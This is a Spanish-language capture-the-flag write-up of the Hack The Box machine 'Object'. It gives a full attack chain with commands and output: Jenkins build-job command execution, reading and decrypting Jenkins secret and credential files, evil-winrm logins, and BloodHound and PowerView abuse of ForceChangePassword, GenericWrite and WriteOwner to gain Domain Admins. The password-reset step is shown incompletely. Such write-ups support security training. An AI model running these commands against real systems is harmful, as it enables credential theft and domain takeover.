---
layout: post
title: Object
date: 2023-02-14
description:
img:
fig-caption:
tags: [OSCP, OSEP, eWPT, OSWE]
---
___

<center><img src="/writeups/assets/img/Object-htb/Object.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Abuso de Jenkins

* Enumeración con BloodHound

* Abuso de ForceChangePassword

* Abuso de GenericWrite

* Abuso de WriteOwner (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.132 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 14:14 GMT
Nmap scan report for 10.10.11.132
Host is up (0.14s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 27.10 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80,5985,8080 10.10.11.132 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 14:15 GMT
Nmap scan report for 10.10.11.132
Host is up (0.060s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
| http-methods: 
|_  Potentially risky methods: TRACE
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds
```

## Puerto 80,8080 (HTTP)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
for i in 80 8080; do echo -e "\n[+] Puerto $i"; whatweb http://10.10.11.132:$i; done

[+] Puerto 80
http://10.10.11.132:80 [200 OK] Country[RESERVED][ZZ], Email[ideas@object.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.132], JQuery[2.1.3], Microsoft-IIS[10.0], Modernizr, Script, Title[Mega Engines]

[+] Puerto 8080
http://10.10.11.132:8080 [403 Forbidden] Cookies[JSESSIONID.2d0635da], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.2d0635da], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://10.10.11.132:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.2d0635da], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.2d0635da], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```

Añado el dominio ```object.htb``` al ```/etc/hosts```

Las páginas principales se ven así:

<img src="/writeups/assets/img/Object-htb/1.png" alt="">

Aplico fuzzing en el puerto 80, pero no encuentro nada

Me registro en el Jenkins

<img src="/writeups/assets/img/Object-htb/2.png" alt="">

Puedo crear un nuevo trabajo

<img src="/writeups/assets/img/Object-htb/3.png" alt="">

Es posible inyectar un comando a la hora de construir un proyecto

<img src="/writeups/assets/img/Object-htb/4.png" alt="">

Pero en este caso, no tengo permisos para ejecutarlo cuando quiera, pero si se puede agregar una configuración para que lo haga cada cierto tiempo

<img src="/writeups/assets/img/Object-htb/5.png" alt="">

Una vez se ha compilado, ya puedo ver el output del comado que he indicado

<img src="/writeups/assets/img/Object-htb/6.png" alt="">

Otra forma alternativa es crear un token para poder administrar remotamente el proyecto y desde mis ajustes de usuario otro para poder interactuar con la API

<img src="/writeups/assets/img/Object-htb/7.png" alt="">

<img src="/writeups/assets/img/Object-htb/8.png" alt="">

La sintaxis para introducir todos los datos correctamente se puede encontrar en la documentación de [Jenkins](https://www.jenkins.io/doc/book/system-administration/authenticating-scripted-clients/)

<img src="/writeups/assets/img/Object-htb/9.png" alt="">

```null
curl -s -X GET 'http://rubbx:11a8956263bda19798dacf5911460d759c@10.10.11.132:8080/job/Testing/build?token=rubbx'
```

Mi problema ahora, es que hay reglas de Firewall implementadas que me impiden enviarme una reverse shell. Sin embargo, por ICMP si que tengo conectividad

<img src="/writeups/assets/img/Object-htb/10.png" alt="">

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:55:30.254225 IP 10.10.11.132 > 10.10.16.2: ICMP echo request, id 1, seq 5433, length 40
14:55:30.254297 IP 10.10.16.2 > 10.10.11.132: ICMP echo reply, id 1, seq 5433, length 40
```

A pesar de ello, tampoco es posible a través de este protocolo. Al no tener conectividad por HTTP para referenciarlo a mi equipo, tenía que ejecutarlo en base64 directamente desde esta pseudoterminal, pero al ser tan grande, se queda colgado

Enumero las reglas de Firewall que bloquean tráfico saliente

<img src="/writeups/assets/img/Object-htb/11.png" alt="">

<img src="/writeups/assets/img/Object-htb/12.png" alt="">

Listo los recursos existentes en el directorio actual

```null
cmd /c powershell -c dir -force
```

```null
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c dir -force 


    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/14/2023   7:14 AM              0 ')
```

Busco por ficheros de configuración en ```\.jenkins```

```null
cmd /c powershell -c dir ..\..\ -force
```

```null
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c dir ..\..\ -force 


    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/14/2023   6:34 AM                jobs                                                                  
d-----       10/20/2021  10:19 PM                logs                                                                  
d-----       10/20/2021  10:08 PM                nodes                                                                 
d-----       10/20/2021  10:12 PM                plugins                                                               
d-----       10/20/2021  10:26 PM                secrets                                                               
d-----       10/25/2021  10:31 PM                updates                                                               
d-----       10/20/2021  10:08 PM                userContent                                                           
d-----        2/14/2023   6:28 AM                users                                                                 
d-----       10/20/2021  10:13 PM                workflow-libs                                                         
d-----        2/14/2023   6:40 AM                workspace                                                             
-a----        2/14/2023   6:14 AM              0 .lastStarted                                                          
-a----        2/14/2023   7:31 AM             40 .owner                                                                
-a----        2/14/2023   6:14 AM           2505 config.xml                                                            
-a----        2/14/2023   6:14 AM            156 hudson.model.UpdateCenter.xml                                         
-a----       10/20/2021  10:13 PM            375 hudson.plugins.git.GitTool.xml                                        
-a----       10/20/2021  10:08 PM           1712 identity.key.enc                                                      
-a----        2/14/2023   6:14 AM              5 jenkins.install.InstallUtil.lastExecVersion                           
-a----       10/20/2021  10:14 PM              5 jenkins.install.UpgradeWizard.state                                   
-a----       10/20/2021  10:14 PM            179 jenkins.model.JenkinsLocationConfiguration.xml                        
-a----       10/20/2021  10:21 PM            357 jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml           
-a----       10/20/2021  10:21 PM            169 jenkins.security.QueueItemAuthenticatorConfiguration.xml              
-a----       10/20/2021  10:21 PM            162 jenkins.security.UpdateSiteWarningsConfiguration.xml                  
-a----       10/20/2021  10:08 PM            171 jenkins.telemetry.Correlator.xml                                      
-a----        2/14/2023   6:14 AM            907 nodeMonitors.xml                                                      
-a----        2/14/2023   7:56 AM            130 queue.xml                                                             
-a----       10/20/2021  10:28 PM            129 queue.xml.bak                                                         
-a----       10/20/2021  10:08 PM             64 secret.key                                                            
-a----       10/20/2021  10:08 PM              0 secret.key.not-so-secret    
```

Me traigo el ```config.xml```

```null
cmd /c powershell -c type ..\..\config.xml
```

```null
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c type ..\..\config.xml 
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <disabledAdministrativeMonitors>
    <string>jenkins.diagnostics.ControllerExecutorsNoAgents</string>
    <string>jenkins.security.QueueItemAuthenticatorMonitor</string>
    <string>hudson.diagnosis.ReverseProxySetupMonitor</string>
  </disabledAdministrativeMonitors>
  <version>2.317</version>
  <numExecutors>2</numExecutors>
  <mode>NORMAL</mode>
  <useSecurity>true</useSecurity>
  <authorizationStrategy class="hudson.security.GlobalMatrixAuthorizationStrategy">
    <permission>hudson.model.Hudson.Administer:admin</permission>
    <permission>hudson.model.Hudson.Read:authenticated</permission>
    <permission>hudson.model.Item.Cancel:authenticated</permission>
    <permission>hudson.model.Item.Configure:authenticated</permission>
    <permission>hudson.model.Item.Create:authenticated</permission>
    <permission>hudson.model.Item.Delete:authenticated</permission>
    <permission>hudson.model.Item.Discover:authenticated</permission>
    <permission>hudson.model.Item.Read:authenticated</permission>
    <permission>hudson.model.Item.Workspace:authenticated</permission>
  </authorizationStrategy>
  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
    <disableSignup>false</disableSignup>
    <enableCaptcha>false</enableCaptcha>
  </securityRealm>
  <disableRememberMe>false</disableRememberMe>
  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>
  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>
  <markupFormatter class="hudson.markup.EscapedMarkupFormatter"/>
  <jdks/>
  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
  <clouds/>
  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>
  <views>
    <hudson.model.AllView>
      <owner class="hudson" reference="../../.."/>
      <name>all</name>
      <filterExecutors>false</filterExecutors>
      <filterQueue>false</filterQueue>
      <properties class="hudson.model.View$PropertyList"/>
    </hudson.model.AllView>
  </views>
  <primaryView>all</primaryView>
  <slaveAgentPort>-1</slaveAgentPort>
  <label></label>
  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>
  </crumbIssuer>
  <nodeProperties/>
  <globalNodeProperties/>
  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>
</hudson>
```

No tiene ninguna contraseña en texto claro, pero eso no quiere decir que no se pueda obtener a partir de otros directorios

```null
cmd /c powershell -c dir -force ..\..\users
```

```null

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c dir -force ..\..\users 


    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/21/2021   2:22 AM                admin_17207690984073220035                                            
d-----        2/14/2023   8:00 AM                rubbx_5416494707770682747                                             
-a----        2/14/2023   6:28 AM            404 users.xml     
```

Entro en el directorio de ```admin```

```null
cmd /c powershell -c dir -force ..\..\users\admin_17207690984073220035
```

```null
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c dir -force ..\..\users\admin_17207690984073220035 


    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/21/2021   2:22 AM           3186 config.xml
```

Y traigo su archivo de configuración

```null
cmd /c powershell -c type ..\..\users\admin_17207690984073220035\config.xml
```

```null
:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c type ..\..\users\admin_17207690984073220035\config.xml 
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
```

Parece haber una contraseña en base64, pero no está en texto claro

```null
echo AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA= | base64 -d; echo
O`frjxxNOh2]{
```

En [Github](https://github.com/hoto/jenkins-credentials-decryptor) hay un repositorio que automatiza el desencriptado

```null
curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor

chmod +x jenkins-credentials-decryptor
```

En el panel de ayuda se puede ver los datos que necesito

```null
./jenkins-credentials-decryptor
Please provide all required flags.

Usage:

  jenkins-credentials-decryptor \
    -m master.key \
    -s hudson.util.Secret \
    -c credentials.xml \
    -o json
```

Se encuentran en el directorio ```secrets```

```null
cmd /c powershell -c dir -force ..\..\secrets
```

```null
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c dir -force ..\..\secrets 


    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/20/2021  10:08 PM                filepath-filters.d                                                    
d-----       10/20/2021  10:08 PM                whitelisted-callables.d                                               
-a----       10/20/2021  10:26 PM            272 hudson.console.AnnotatedLargeText.consoleAnnotator                    
-a----        2/14/2023   7:29 AM             48 hudson.console.ConsoleNote.MAC                                        
-a----       10/20/2021  10:26 PM             32 hudson.model.Job.serverCookie                                         
-a----       10/20/2021  10:15 PM            272 hudson.util.Secret                                                    
-a----       10/20/2021  10:08 PM             32 jenkins.model.Jenkins.crumbSalt                                       
-a----       10/20/2021  10:08 PM            256 master.key                                                            
-a----       10/20/2021  10:08 PM            272 org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY     
-a----       10/20/2021  10:21 PM              5 slave-to-master-security-kill-switch                                  
```

Abro los dos y copio su contenido

```null
cmd /c powershell -c type ..\..\secrets\master.key
```

```null
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c type ..\..\secrets\master.key 
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
```

Pero el secreto no es légible, por lo que hay que convierlo a base64

```null
cmd /c powershell -c type ..\..\secrets\hudson.util.Secret
```

```null
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c type ..\..\secrets\hudson.util.Secret 
?aPT¤<�Qw3Š"_rA?Ÿgú›dw-J)
uM+',Ab^n"
\ŒU!Eös›E1Ž1ƒ¦a¡;>cxoU<Ø_Oæ˜T_8	Œ’«¨xd$3IYU
ck1I`}“A”¯Yv-.¡,?ªc
`K?ÿ8
D?aIƒXOD-�"'__¡<„Gt\¤Q†_]’s"?€>J/c®IL('_�Uÿ?JI" -|R'7SŠ=vP7^:^DO{§KI8ýŽz–!U?x"£ˆXEÿP¨fS E4�Lš^^”dØ* E—,Z^uOrtdE,! 7záQ"

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>exit 0 
Finished: SUCCESS
```


```null
cmd /c powershell -c [convert]::ToBase64String((Get-Content -path "..\..\secrets\hudson.util.Secret" -Encoding byte))
```

```null

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c [convert]::ToBase64String((Get-Content -path "..\..\secrets\hudson.util.Secret" -Encoding byte)) 
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```

Obtengo las credenciales para el usuario ```oliver```

```null
./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml
[
  {
    "id": "320a60b9-1e5c-4399-8afe-44466c9cde9e",
    "password": "c1cdfun_d2434\u0003\u0003\u0003",
    "username": "oliver"
  }
]
```

Gano acceso al sistema por ```winrm```

```null
evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\oliver\Documents> 
```

Puedo visualizar la primera flag

```null
*Evil-WinRM* PS C:\Users\oliver\Desktop> type user.txt
55b0221b2f1bc233c2285f2003764cee
```

# Escalada

No tengo ningún privilegio especial

```null
*Evil-WinRM* PS C:\Users\oliver\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Al ver las reglas de firewall, se había reportado también que estoy ante un DC, por lo que puedo utilizar ```BloodHound``` para encontrar formas de escalar privilegios

Utilizo como ingestor ```SharpHound.ps1```

```null
*Evil-WinRM* PS C:\Temp> upload /opt/SharpHound.ps1
Info: Uploading /opt/SharpHound.ps1 to C:\Temp\SharpHound.ps1

                                                             
Data: 1297764 bytes of 1297764 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Temp> Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Temp> Invoke-BloodHound -c All
Parameter cannot be processed because the parameter name 'c' is ambiguous. Possible matches include: -CollectionMethod -ComputerFile -CacheFileName -CollectAllProperties.
*Evil-WinRM* PS C:\Temp> Invoke-BloodHound -CollectionMethod All
*Evil-WinRM* PS C:\Temp> dir


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/14/2023   8:33 AM           9026 20230214083343_BloodHound.zip
-a----        2/14/2023   8:33 AM          10043 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin
-a----        2/14/2023   8:32 AM         973325 SharpHound.ps1

*Evil-WinRM* PS C:\Temp> download C:\Temp\20230214083343_BloodHound.zip /home/rubbx/Desktop/HTB/Machines/Object/bh.zip
Info: Downloading C:\Temp\20230214083343_BloodHound.zip to /home/rubbx/Desktop/HTB/Machines/Object/bh.zip

                                                             
Info: Download successful!
```

El usuario ```oliver``` tiene ForceChangePassword sobre que ```smith```, puede hacer GenericWrite sobre  ```maria```, que a su vez tiene WriteOwner sobre ```Domain Admins```

<img src="/writeups/assets/img/Object-htb/14.png" alt="">

Primero le cambio la contraseña a ```smith```

```null
*Evil-WinRM* PS C:\Temp> $SecPassword = ConvertTo-SecureString 'rubbx' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> upload /opt/PowerSploit/Recon/PowerView.ps1
Info: Uploading /opt/PowerSploit/Recon/PowerView.ps1 to C:\Temp\PowerView.ps1

                                                             
Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Temp> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

Me conecto por winrm como este usuario

```null
evil-winrm -i 10.10.11.132 -u 'smith' -p 'Password123!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\smith\Documents> 
```

En este caso, voy a alterar los logon script, para que una vez inicie sesión, se ejecute una tarea programada en un script de Powershell. Pero hay que tener en cuenta que están definidas ciertas reglas de Firewall que impiden las conexiones externas. Pruebo también por ICMP, con ```Invoke-PowerShellIcmp.ps1``` de nishang, pero por alguna razón lo bloquea. Por tanto, solo falta intentar ver lo que tiene en sus directorios, depositando el output en un archivo que pueda leer de mi lado, con la esperanza de encontrar algo que sirva para ganar acceso

```null
*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Temp> echo "dir C:\Users\Maria\Desktop\ > C:\Temp\output.txt" > cmd.ps1
*Evil-WinRM* PS C:\Temp> Set-DomainObject -Identity maria -SET @{serviceprincipalname='C:\Temp\cmd.ps1'}

*Evil-WinRM* PS C:\Temp> type output.txt


    Directory: C:\Users\Maria\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls
```

Me traigo el archivo XLS

```null
*Evil-WinRM* PS C:\Temp> echo "copy C:\Users\Maria\Desktop\Engines.xls C:\Temp\Engines.xls" > cmd.ps1
```

Lo descargo para verlo con libreoffice

```null
*Evil-WinRM* PS C:\Temp> download C:\Temp\Engines.xls /home/rubbx/Desktop/HTB/Machines/Object/Engines.xls
Info: Downloading C:\Temp\Engines.xls to /home/rubbx/Desktop/HTB/Machines/Object/Engines.xls

                                                             
Info: Download successful!
```

Contiene credenciales

<img src="/writeups/assets/img/Object-htb/15.png" alt="">

Una de ellas es la suya a nivel de sistema

```null
evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\maria\Documents> 
```

Como este usuario tiene WriteOwner sobre ```Domain Admins```, puedo hacerme propietario de este objeto para añadirme al grupo y convertirme en Administrador del Dominio

```null
*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Temp> Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
*Evil-WinRM* PS C:\Temp> Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity maria
*Evil-WinRM* PS C:\Users\maria\Documents> net group "Domain Admins" maria /add /domain
The command completed successfully.
```

Puedo visualizar la segunda flag

```null
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
5f0f08c36d3293e182cb179811f76238
```